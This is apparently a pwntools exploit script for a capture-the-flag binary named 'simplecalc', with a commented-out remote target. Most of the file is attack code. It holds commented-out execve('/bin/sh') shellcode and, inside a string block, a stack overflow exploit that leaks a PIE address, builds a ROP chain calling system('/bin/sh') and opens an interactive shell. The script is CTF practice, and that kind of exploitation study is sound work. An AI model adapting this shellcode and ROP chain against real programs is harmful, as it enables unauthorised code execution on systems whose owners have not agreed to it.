from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#target = remote("chal1.sieberr.live", 15001)


elf = context.binary = ELF('./simplecalc')  # local copy

target = process()

#pid, io_gdb = gdb.attach(target, api=True, gdbscript="c")

# This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
# However it looks like that site is down now
# This shellcode will pop a shell when we run it
#payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
#payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
# Padding to the return address
#payload += b"0"*(0x28 - len(payload))

# Overwrite the return address with the address of the start of our input

# Send the payload, drop to an interactive shell to use the shell we pop

target.recvall()

'''
target.sendafter(b"> ", b"A" * 32)
target.send(b'\n')

target.recvuntil(b"A" * 32)
leak = target.recv(6)
leak = leak.ljust(8, b'\x00') 
leaked_main_pie = int.from_bytes(leak, 'little')
elf.address = leaked_main_pie - elf.sym.main #OR elf.symbols['main']
#ways to access other functions in elf: elf.functions.gifts()

print(hex(elf.sym.main))
#io_gdb.execute(f"break *{hex(elf.sym.main)}")

pop_rdi = 0x000000000000119d #Pulled from disas (objdump)
ret = 0x0000000000001016

payload = flat(
    b"A" * 0x28,
    p64(elf.address + pop_rdi),
    p64(next(elf.search(b"/bin/sh\x00"))),
    p64(elf.address + ret) * 21,
    p64(elf.plt.system)

)


target.recvuntil(b"> ")
target.send(payload)
target.send(b'\n')
target.interactive()

'''